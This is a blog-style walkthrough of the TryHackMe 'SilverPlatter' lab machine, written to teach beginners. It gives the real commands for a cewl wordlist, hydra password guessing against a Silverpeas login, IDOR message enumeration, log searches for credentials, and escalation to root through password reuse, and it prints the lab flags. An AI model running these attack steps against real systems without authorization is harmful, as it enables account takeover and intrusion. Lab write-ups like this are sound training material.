---
layout: default
title: "TryHackMe: SilverPlatter Walkthrough (Difficulty Easy; Linux machine)"
date: 2025-07-16
---


# SilverPlatter Walkthrough (Difficulty Easy; Linux machine)


# Overview
As part of the class [Introduction to Hacking Methodology](https://academy.simplycyber.io/p/introduction-to-hacking-methodology)
I took [these notes](https://www.notion.so/Introduction-to-Hacking-Methodology-GitHub-Pages-23346f98ca3080d18194f3b09c709143?source=copy_link) while hacking a machine called silver-platter.

This is an introductory class and the difficulty of the Linux machine is fairly low; still, this is my first time I have managed to hack one (with some help from one video) and I am very proud of it, so I decided to put this page together to help other students like me.
My main focus with this walkthrough is in highlighting the reasoning behind the commands, as opposed to simply listing all the required steps without justification or context. I hope you will find it useful.

When you look at my solution, do not get discouraged because you fear you would never think about doing some of these things, instead consider that:
1. I have been studying hacking for 6 solid months, and so far this machine is all I have to show for it.
2. I used Claude AI to help me every step of the way.
3. I am a software engineer that has been working for 25 years in Silicon Valley.
4. It took me 12 days to completely solve this machine and find both flags (5 days to find the first one.)
5. Since I was stuck during the privilege escalation (privesc) phase, I had to give a peek to a video in the course that essentially says "I am not gonna tell you yet how to privesc this machine, but I am going to tell you that it has something to do with the fact that tim belongs to the adm group." Sincerely, I don't know how many times I had already looked at the logs and didn't see the password, but once I knew that the solution HAD to be in the logs, I was finally able to see it; so what did I spend the last 7 days doing? In short, chasing rabbit holes, but it does not mean that it was all for nothing, in fact I believe that trying and failing is how I will eventually learn how to hack faster and better.


# Reconnaissance (Information Gathering)

#### Action
Do not forget to move to the **/tmp** directory:

```
┌──(username㉿machinename)-[~]
└─$ cd /tmp
┌──(username㉿machinename)-[/tmp]
└─$ pwd                                                          
/tmp
```

This way when we download something or try to output a new file, we will not get "permission denied" errors because we have  no write access to whatever directory we are in; this is especially relevant in our target machine, because the user "tim" we will eventually impersonate has a home directory that is owned by root, and tim himself does not have write access to his own home!


# Port Scanning
We start with port scanning, that normally means using nmap; in fact, we are going to use nmap *indirectly* via rustscan because rustscan is fast, and we like not having to wait too long; this and other outputs can be quite long, so for the sake of this document, we are going to cut all outputs down to their essential parts:

```
┌──(kali㉿kali)-[/tmp]
└─$ rustscan -a 10.10.160.74 -- -A

PORT     STATE SERVICE    REASON         VERSION
22/tcp   open  ssh        syn-ack ttl 61 OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http       syn-ack ttl 61 nginx 1.18.0 (Ubuntu)
8080/tcp open  http-proxy syn-ack ttl 60

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   79.35 ms  10.6.0.1
2   ... 3
4   149.33 ms silverplatter.thm (10.10.105.52)
```

From the TRACEROUTE section we see that the domain name is **silverplatter.thm** with IPv4 address **10.10.105.52**

### Action
The file **/etc/hosts** works as a sort of local DNS by mapping domain names to IP addresses.
We add both the domain and the IPv4 address to the /etc/hosts file, so we will be better able to reuse our CLI commands even if the IP address of the VM changes (for instance, because the VM's timeout expires), so inside the **/etc/hosts** file we add this line:

```
10.10.105.52    silverplatter.thm
```

Of course, every time the IP address changes, we will have to keep updating it inside this file as well.

### Action
Let's verify that **/etc/hosts** works by trying to ping silverplatter.thm:

```
┌──(kali㉿kali)-[/tmp]
└─$ ping silverplatter.thm
PING silverplatter.thm (10.10.105.52) 56(84) bytes of data.
64 bytes from silverplatter.thm (10.10.105.52): icmp_seq=1 ttl=61 time=190 ms
64 bytes from silverplatter.thm (10.10.105.52): icmp_seq=2 ttl=61 time=213 ms
^C
--- silverplatter.thm ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1001ms
rtt min/avg/max/mdev = 190.082/201.316/212.550/11.234 ms
```

Yes, we can ping the targer machine (notice that ping's output tells us the actual IP address is 10.10.105.52).

### Note
Not all CLI commands support converting the domain names in **/etc/hosts** so with experience we will have to learn which ones do (like ping) and which ones don't.


# Our Strategy
From the output of rustscan/nmap we know that there are 3 ports:

```
PORT     STATE SERVICE    REASON         VERSION
22/tcp   open  ssh        syn-ack ttl 61 OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http       syn-ack ttl 61 nginx 1.18.0 (Ubuntu)
8080/tcp open  http-proxy syn-ack ttl 60
```

We know that ssh is very secure, so typically is not the primary target of ethical hackers; it is still good to check whether the particular implementation installed on the target machine is vulnerable, but ssh is more of a last resort that is considered only when we have failed to exploit historically more vulnerable protocols like http(s) or smb.

We see that port 80 runs the http protocol, that means our target machine runs a web server behind that port, so the first thing we should do it to point our web browser to http://silverplatter.thm:80 to see what the default web page looks like. Not only, we should also browse around to see whether there are any information leaks that we can use to our advantage, like user names, passwords, etc. We should also right-click on the View Source feature available on all modern web browsers, and check whether there are any leaks in the source code itself: sometimes even a comment left by a developer may reveal a piece of information that helps us get deeper into our target machine. Finally, we should look for the type of web server and its version that is running on the target machine, and look for known vulnerabilities that we can exploit.

Finally, when nmap says "http-proxy" on port 8080, it means:
- HTTP-like traffic is running on that port
- Port 8080 is commonly used for HTTP proxies and web applications
- nmap's service detection thinks it's most likely a proxy based on the port number and response patterns

Common Scenarios for "http-proxy" on Port 8080 are:
1. Web Applications: Tomcat servers, Spring Boot applications, Development web servers, Alternative HTTP services, Admin interfaces.
2. Actual HTTP Proxies: Squid proxy, Corporate web proxies, Reverse proxies.
3. Other HTTP Services: API endpoints, Microservices, Load balancers, Application servers.
In our case we will discover that there is a Silverpeas application server running on port 8080, that is not an actual proxy, but a web application.

Sometimes nmap's educated guess is wrong, especially with:
- Custom applications
- Non-standard configurations
- Applications that mimic other services

What should we do when we see "http-proxy" behind a certain port, say 8080?
- Don't assume it's actually a proxy
- Browse to it with a web browser (http://target:8080)
- Use curl to examine headers: curl -I http://target:8080
- Look for common web app paths: /admin, /login, /app, etc.
- Run more detailed scans: nmap -sC -sV -p 8080 target


# Our Tactics
Let me give you a little bit of a foreshadow: while examining port 80, we will talk about using hydra hoping to find the password for a user named scr1ptkiddy.

But in order to make hydra work correctly, we will have to already know that we need to point hydra toward port 8080.

So, how do we know that 8080 is the port we are supposed to use with hydra? Simple, when we look at the CONTACT page on the web site on port 80, we will learn about the existence of a Silverpeas server; because of such information disclosure, of course we will try to point our web browser at **http://silverplatter.thm:8080/silverpeas** (notice that the port is 8080 and that silverpeas has been appended to the end of the URL) and discover that there is indeed a login page for Silverpeas hiding at **http://silverplatter.thm:8080/silverpeas/defaultLogin.jsp** .

In short:
1. We pointed the web browser to the web site behind port 80 and from its CONTACT page we discovered that there is a user scr1ptkiddy on a Silverpeas server.
2. We got a hunch that the Silverpeas server may be located at port 8080 (where rustscan/nmap told us that an http-proxy lives), and so we pointed our web browser to **http://silverplatter.thm:8080/silverpeas** and discovered a login page located at **http://silverplatter.thm:8080/silverpeas/defaultLogin.jsp** .
3. We now know that we need to point hydra to port 8080 to try finding the password for scr1ptkiddy.


# 22/tcp (ssh) OpenSSH 8.9p1 [part 1]
From the port scanning output we gather that OpenSSH is on version 8.9p1; in general, ssh is not the first thing we would consider hacking, because it is very secure, and this machine is no exception, so we move on.


# 80/tcp (http) nginx 1.18.0 (Ubuntu)
From the port scanning output we gather that nginx (static web server) is on version 1.18.0 and that the operating system is Ubuntu Linux.

## Any nginx Vulnerabilities?
We should look for vulnerabilities for version 1.18.0 of nginx, but in this case, after extensive googling, I couldn't find any exploitable vulnerability, so I moved on.

## silverplatter.thm:80
Since on port 80 we have a web server, the first thing we are going to do is to point our web browser to http://silverplatter.thm:80 and visually check the web site.

![Silverplatter's front page](/assets/silverplatter-web-site.png){: style="border: 2px solid black;"}

Clicking on the **CONTACT** link we access this juicy piece of information disclosure:

![Silverplatter's CONTACT page](/assets/silverplatter-web-site-contact.png){: style="border: 2px solid black;"}

From the page above we collect the following information:
- Username: scr1ptkiddy
- Role: project manager
- Silverpeas (running on port 8080?)

In short, it appears that there is a Silverpeas server with a user named **scr1ptkiddy** for whom we don't know the password yet.
We also learn that there might be one more user that has a managerial role (no password for this user as well.)

### View Source (look at the source code)
It is also important, when looking at a web site, to use the View Source feature available in all modern web browsers and see whether there are any obvious pieces of interesting information left by the developers in comments (things like users, passwords, and generally speaking, any type of information disclosure that would help us gain an advantage in our attempt to get into the machine.) Unfortunately, in this particular web site's source code there is nothing noteworthy to point out.

### cewl
Since we know about a user named scr1ptkiddy for a Silverpeas server running on the machine we are attacking, it is worth collecting all keywords from the pages of the web site, and later use them with a program like hydra to search the password for scr1ptkiddy. Just to clarify, we are talking about collecting all the words that make the text of the http://silverplatter.thm web site and store them in a single file, one word per line, with the intention of using it later with a program like hydra to find the password for scr1ptkiddy.

Here is the command to scan the web site and collect all its keywords in a file named **silverplatter_keywords.txt**:

```
┌──(kali㉿kali)-[/tmp]
└─$ cewl http://silverplatter.thm > silverplatter_keywords.txt
```

This command collects all keywords in silverplatter.thm and saves them into a file.

### hydra
We are going to use hydra to *password spray* all the keywords in **silverplatter_keywords.txt** in an attempt to find the password for user scr1ptkiddy.

#### hydra requires several parameters
First, we check the form's action attribute to find the real target for hydra:

```
┌──(kali㉿kali)-[/tmp]
└─$ curl -s http://silverplatter.thm:8080/silverpeas/defaultLogin.jsp | grep -i "action="
<form id="formLogin" action="/silverpeas/AuthenticationServlet" method="post" accept-charset="UTF-8">
```
Notice that the curl command takes /silverpeas/defaultLogin.jsp as input, because it is a GET request to the login page we see in our web browser: we are reading the login page to understand its structure and the page defaultLogin.jsp contains the form definition. The returned action attribute uses /silverpeas/AuthenticationServlet that is the backend endpoint that actually processes the login request: this backend endpoint is what we will eventually pass to hydra, because hydra will be submitting a POST request to the actual processing endpoint.

Second, we run this command to learn more about how to authenticate with Silverpeas:

```
┌──(kali㉿kali)-[/tmp]
└─$ curl -s http://silverplatter.thm:8080/silverpeas/defaultLogin.jsp | grep -E 'name=|type="password"|type="text"
  <meta name="viewport" content="initial-scale=1.0"/>'
          <label><span>Login</span><input type="text" name="Login" id="Login"/></label>
          <label><span>Password</span><input type="password" name="Password" id="Password" autocomplete="off"/></label>
            <input class="noDisplay" type="hidden" name="DomainId" value="0"/>
```
Notice that, again, the curl command takes /silverpeas/defaultLogin.jsp as input, for similar reasons as explained earlier.

From the above output we see that, in addition to the visible **Login** and **Password** fields, the hidden **DomainId=0** field is critical for Silverpeas authentication.

Third, we also need to identify a pattern in the Silverpeas’ response that allows us to discard incorrect passwords, so we run the command below passing a "wrong password" on purpose:

(btw, wouldn't it be funny if - after innocently running it - we realized that 'wrongpassword' is the correct password..?!)

```
┌──(kali㉿kali)-[/tmp]
└─$ curl -v -d "Login=scr1ptkiddy&Password=wrongpassword&DomainId=0" http://silverplatter.thm:8080/silverpeas/AuthenticationServlet
...
Location: http://silverplatter.thm:8080/silverpeas/Login?ErrorCode=1&DomainId=-1
...
```
Notice that the curl command this time takes /silverpeas/AuthenticationServlet as input, because it is submitting a POST request to the actual processing endpoint (AuthenticationServlet) that processes the login attempt.

From the above, we see that **ErrorCode=1** appears in Silverpeas' responses when the server rejects an incorrect password.

So, putting all of the above together (plus the fact that 8080 is the appropriate port number to pass to hydra), we get to finally write this hydra command:

```
┌──(kali㉿kali)-[/tmp]
└─$ hydra -l scr1ptkiddy -P silverplatter_keywords.txt silverplatter.thm -s 8080 http-post-form "/silverpeas/AuthenticationServlet:Login=^USER^&Password=^PASS^&DomainId=0:ErrorCode=1"
...
[8080][http-post-form] host: silverplatter.thm   login: scr1ptkiddy   password: adipiscing
...
```
From the above output we see that **adipiscing** is the correct password for scr1ptkiddy.

Notice that also hydra takes /silverpeas/AuthenticationServlet as input, because it is submitting a POST request to the actual processing endpoint (AuthenticationServlet) that processes the login attempt.

What is ^USER^ in the hydra command? In our scenario, ^USER^ stands for scr1ptkiddy, passed to hydra using the -l parameter.

What is ^PASS^  in the hydra command? One by one, it assumes the values of the various passwords in the silverplatter_keywords.txt file, passed to hydra using the -P parameter.

For instance, when ^USER^ is scr1ptkiddy and ^PASS^ is adipiscing, the command passed to /silverpeas/AuthenticationServlet becomes:

```
hydra -l scr1ptkiddy -P silverplatter_keywords.txt silverplatter.thm -s 8080 http-post-form "/silverpeas/AuthenticationServlet:Login=scr1ptkiddy&Password=adipiscing&DomainId=0:ErrorCode=1"
```
The above command will be the one for which the backend will NOT return error.


# Exploitation (Use Information Gathered During Reconnaissance)
Now, we get to use some of the information we gained during the reconnaissance (information gathering) phase.

## 8080/tcp (http-proxy)
After browsing to http://silverplatter.thm:8080/silverpeas/defaultLogin.jsp we enter **scr1ptkiddy** and **adipiscing**:

![Silverpeas Login Window](/assets/silverpeas-login-window.webp)

We get to enter inside the Silverpeas server and we notice that there is a notification waiting for us in the top left corner:

![Silverpeas Login Window](/assets/silverpeas-scr1ptkiddy-main-menu.webp){: style="border: 2px solid black;"}

Then if we click on the See more link …

![Silverpeas Login Window](/assets/silverpeas-scr1ptkiddy-see-more-link.webp)

… we land on this page

![Silverpeas Login Window](/assets/silverpeas-scr1ptkiddy-inbox.webp){: style="border: 2px solid black;"}

Now, when we click on the Game Night link, a window opens …

![Silverpeas Login Window](/assets/silverpeas-scr1ptkiddy-idor.webp)

… that shows an opportunity for a potential IDOR attack by changing the value of ReadMessage.
We can systematically try all values starting from 1 and going up, and as soon as we get to 6 we find an important message

![Silverpeas Login Window](/assets/silverpeas-scr1ptkiddy-tim-ssh.webp){: style="border: 2px solid black;"}

From here we gather the following information:
- there is an SSH login and password
- username: tim
- password: cm0nt!md0ntf0rg3tth!spa$$w0rdagainlol

So now we know two users with their respective passwords:
1. **scr1ptkiddy** with password **adipiscing** for the Silverpeas server
2. **tim** with password **cm0nt!md0ntf0rg3tth!spa$$w0rdagainlol** for the SSH server

## 22/tcp (ssh) OpenSSH 8.9p1 [part 2]
Now that we know tim's ssh password, we can finally use it to login to our target machine:

```
┌──(kali㉿kali)-[/tmp]
└─$ ssh tim@silverplatter.thm # Password: cm0nt!md0ntf0rg3tth!spa$$w0rdagainlol
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@    WARNING: REMOTE HOST IDENTIFICATION HAS CHANGED!     @
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
IT IS POSSIBLE THAT SOMEONE IS DOING SOMETHING NASTY!
Someone could be eavesdropping on you right now (man-in-the-middle attack)!
It is also possible that a host key has just been changed.
The fingerprint for the ED25519 key sent by the remote host is
SHA256:O5LFYE0hOpCy4eJPMF4wjWiJOIgxwEHxX2FF/rtjN8A.
Please contact your system administrator.
 Add correct host key in /home/kali/.ssh/known_hosts to get rid of this message.
Offending ECDSA key in /home/kali/.ssh/known_hosts:3
  remove with:
  ssh-keygen -f '/home/kali/.ssh/known_hosts' -R 'silverplatter.thm'
Host key for silverplatter.thm has changed and you have requested strict checking.
Host key verification failed.
```
The Warning Explains that SSH stores a "fingerprint" of each server we connect to in our ~/.ssh/known_hosts file.
This fingerprint uniquely identifies the server's cryptographic key.
When we try to connect again, SSH compares the current fingerprint with the stored one and if they don't match, we get this warning.

Normally, this would be a concern, and on a production machine we would better ask the system administrator whether things are fine, but since this is a virtual machine we are connecting to, and it is pretty common for servers to be rebuilt/reinstalled in VM environments, we can safely proceed issuing the command the warning above suggests; this command removes the old fingerprint of silverplatter.thm from the known_hosts file:

```
┌──(kali㉿kali)-[/tmp]
└─$ ssh-keygen -f '/home/kali/.ssh/known_hosts' -R 'silverplatter.thm'
# Host silverplatter.thm found: line 1
# Host silverplatter.thm found: line 2
# Host silverplatter.thm found: line 3
/home/kali/.ssh/known_hosts updated.
Original contents retained as /home/kali/.ssh/known_hosts.old
```

Now, we can try to ssh again into our target machine that will prompt us to accept the new fingerprint:

```
┌──(kali㉿kali)-[/tmp]
└─$ ssh tim@silverplatter.thm # Password: cm0nt!md0ntf0rg3tth!spa$$w0rdagainlol
The authenticity of host 'silverplatter.thm (10.10.30.149)' can't be established.
ED25519 key fingerprint is SHA256:O5LFYE0hOpCy4eJPMF4wjWiJOIgxwEHxX2FF/rtjN8A.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'silverplatter.thm' (ED25519) to the list of known hosts.
tim@silverplatter.thm's password: 
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-91-generic x86_64)
tim@ip-10-10-30-149:~$
```

Yuppy, we are finally in! And we can get the user's flag too :)

```
tim@ip-10-10-30-149:~$ whoami
tim
tim@ip-10-10-30-149:~$ ls -la
total 12
dr-xr-xr-x 2 root root 4096 Dec 13  2023 .
drwxr-xr-x 6 root root 4096 Jul 21 20:10 ..
-rw-r--r-- 1 root root   38 Dec 13  2023 user.txt
tim@ip-10-10-30-149:~$ cat user.txt 
THM{c4ca4238a0b923820dcc509a6f75849b}
```

Notice how tim's home is owned by root, and cannot write in his own home!
This is one good reason to move to a directory like **/tmp** where most users have write access:

```
tim@ip-10-10-30-149:~$ cd /tmp
tim@ip-10-10-30-149:/tmp$ ls -lad
drwxrwxrwt 12 root root 4096 Jul 23 01:24 .
```

Notice that pretty much anybody can do anything in this directory.


# Privilege Escalation

In order to find the root flag, we need to become the administrator (root) of this machine, that typically means we either have to directly go from being tim to being root, or we may have to go from being tim to a number of intermediate users, until finally we can become root.

We start by typing a few commands to explore the users on our target machine and figure out what they can do:

## id
tim is part of the adm group, that means he has access to log files:

```
tim@silver-platter:~$ id
uid=1001(tim) gid=1001(tim) groups=1001(tim),4(adm)
```

## sudo -l
But tim is not part of the sudo group, hence tim cannot run sudo:

```
tim@silver-platter:~$ sudo -l    # cm0nt!md0ntf0rg3tth!spa$$w0rdagainlol
[sudo] password for tim: 
Sorry, user tim may not run sudo on silver-platter.
```

## Users
We can look for more users on this machine:

```
tim@ip-10-10-30-149:/tmp$ ls -la /home
total 24
drwxr-xr-x  6 root     root     4096 Jul 21 20:10 .
drwxr-xr-x 19 root     root     4096 Jul 23 01:18 ..
drwxr-x---  2 ssm-user ssm-user 4096 Jul 20 17:05 ssm-user
dr-xr-xr-x  2 root     root     4096 Dec 13  2023 tim
drwxr-x---  5 tyler    tyler    4096 Dec 13  2023 tyler
drwxr-x---  4 ubuntu   ubuntu   4096 Jul 21 20:10 ubuntu
tim@ip-10-10-30-149:/tmp$ ls -al /home/tyler
ls: cannot open directory '/home/tyler': Permission denied
```

It appears that there is a new user named tyler, so we look for what groups tyler belongs to:

```
tim@silver-platter:~$ id tyler
uid=1000(tyler) gid=1000(tyler) groups=1000(tyler),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd)
```

Important groups:
- tyler, like tim, is part of adm
- tyler is part of sudo, so if we can become tyler, we can automatically also become root by typing **sudo -i** (!!)

## Check Logs
User tyler might be the intended escalation path, or there might be information in the logs about tyler's activities, either way, since for the time being we are still tim and we are part of adm, we can check the logs looking for more information:

```
## Check Log Files for tyler Activity

# Look for tyler in authentication logs
grep -r "tyler" /var/log/ 2>/dev/null

# Check for any login attempts or sudo usage by tyler
grep -r "sudo" /var/log/ 2>/dev/null | grep tyler
grep -r "su " /var/log/ 2>/dev/null | grep tyler


## Explore What adm Group Can Access

# Find all files readable by adm group
find / -group adm -type f 2>/dev/null

# Check for any backup files that might contain user info
find /var/backups -type f -readable 2>/dev/null
ls -la /var/backups/

# Look for any configuration files accessible to adm
find /etc -group adm -type f 2>/dev/null


## Check for Silverpeas/Web Application Logs
## (since you gained access through Silverpeas, there might be logs with useful information)

# Look for web server logs
ls -la /var/log/apache2/ 2>/dev/null
ls -la /var/log/nginx/ 2>/dev/null

# Check for any application-specific logs
find /var/log -name "*silver*" -type f 2>/dev/null
find /var/log -name "*tomcat*" -type f 2>/dev/null
find /var/log -name "*java*" -type f 2>/dev/null

# Look for any logs that might contain passwords or credentials
find /var/log -type f -readable 2>/dev/null -exec grep -l "password\|passwd\|credential\|secret" {} \; 2>/dev/null


## Check System Information

# Look at recent system activity
last -n 20
w
who

# Check for any interesting processes running as other users
ps aux | grep tyler
ps aux | grep root
```

Key Findings from the Logs:
1. Tyler has sudo privileges: The logs show tyler successfully running **sudo su** multiple times to become root.
2. Tyler created the tim user: Tyler ran sudo useradd tim and sudo passwd tim
3. Tyler added tim to adm group: Tyler ran sudo usermod -aG adm tim

### The path forward

Since tyler has sudo privileges and can become root, we need to find a way to either:
1. Get tyler's password to SSH as tyler (like we did for tim by looking at Silverpeas’ scr1ptkiddy’s notifications).
2. Look for tyler's credentials in the logs or other files.

## tyler’s password

```
# Look for tyler's password in logs or config files
grep -r "tyler" /var/log/ 2>/dev/null | grep -i "password\|passwd"

# Check if there are any readable files in tyler's directory or hints about tyler's password
find /home/tyler -readable 2>/dev/null

# Look for any sudo configuration that might help
cat /etc/sudoers 2>/dev/null
cat /etc/sudoers.d/* 2>/dev/null

# Check for any SSH keys or configuration
find /home/tyler/.ssh -readable 2>/dev/null

# Look for any scripts or files that might contain tyler's credentials
find /var/log -type f -readable 2>/dev/null -exec grep -l "tyler.*password\|password.*tyler" {} \; 2>/dev/null
```

Key Findings:
1. Tyler has sudo privileges and was created during system installation.
2. PostgreSQL’s password found as _Zd_zx7N823/ (from the Silverpeas Docker containers).

When we find a password for a user, it is always a good idea to check whether such user did password reuse: for instance, in this case, we are hoping that tyler reused the same password for PostgresSQL as for his ssh account:

```
# Let's hope that tyler reused the same password he also used for the database
tim@silver-platter:~$ su tyler    # _Zd_zx7N823/
Password: 
tyler@silver-platter:/home/tim$ whoami
tyler
```

It worked, we are tyler!

Now, we can simply use tyler’s password _Zd_zx7N823/ to **sudo -i** our way into becoming root:

```
tyler@silver-platter:~$ id
uid=1000(tyler) gid=1000(tyler) groups=1000(tyler),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd)
tyler@silver-platter:/home/tim$ sudo -i    # _Zd_zx7N823/
[sudo] password for tyler: 
root@silver-platter:~# whoami
root
root@silver-platter:~# ls -la
total 48
drwx------  5 root root 4096 May  1  2024 .
drwxr-xr-x 19 root root 4096 Dec 12  2023 ..
-rw-------  1 root root  287 May  8  2024 .bash_history
-rw-r--r--  1 root root 3106 Oct 15  2021 .bashrc
-rw-------  1 root root   20 Dec 13  2023 .lesshst
drwxr-xr-x  3 root root 4096 Dec 13  2023 .local
-rw-r--r--  1 root root  161 Jul  9  2019 .profile
-rw-r--r--  1 root root   38 Dec 13  2023 root.txt
-rw-r--r--  1 root root   66 Dec 13  2023 .selected_editor
drwx------  3 root root 4096 Dec 12  2023 snap
drwx------  2 root root 4096 Dec 12  2023 .ssh
-rwxr-xr-x  1 root root   97 Dec 13  2023 start_docker_containers.sh
-rw-r--r--  1 root root    0 Dec 13  2023 .sudo_as_admin_successful
root@silver-platter:~# cat root.txt 
THM{098f6bcd4621d373cade4e832627b4f6}
```

And we found the root flag as well!


# How We Did It
1. Initially, we got our foot in the door inside Silverpeas (on port 8080) logging in via:
   - username scr1ptkiddy found on the CONTACT section on the silverplatter.thm web site
   - scr1ptkiddy's password found applying command cewl to the silverplatter.thm web site
3. We leveraged an IDOR vulnerability in Silverpeas and read tim's ssh's password.
4. We logged in as tim and got the user flag (!!)
5. We used tim’s adm group privileges to read log files.
6. We found tyler's Docker commands containing the database password _Zd_zx7N823/
7. We became tyler using the password _Zd_zx7N823/ tyler also used to access the database.
8. We used sudo -i as tyler (who has sudo privileges) with the same password _Zd_zx7N823/
9. We obtained root shell and retrieved the root flag (!!)


# Lessons Learned
Key learning points:
1. **Web Site Analysis** Examing the pages of the web site revealed the Silverpeas user scr1ptkiddy.
2. **Web Site Analysis** Using the words in the pages of the web site gave us scr1ptkiddy's Silverpeas' password.
3. **Log File Analysis** The adm group membership was crucial for accessing authentication logs.
4. **Information Disclosure** Docker commands in logs revealed sensitive passwords.
5. **Password Reuse** Tyler reused the database password for his user account, a common security mistake.
6. **Sudo Privileges** Tyler had full sudo access, making the escalation straightforward once we had his password.

This was a great example of how proper enumeration and log analysis can lead to successful privilege escalation.
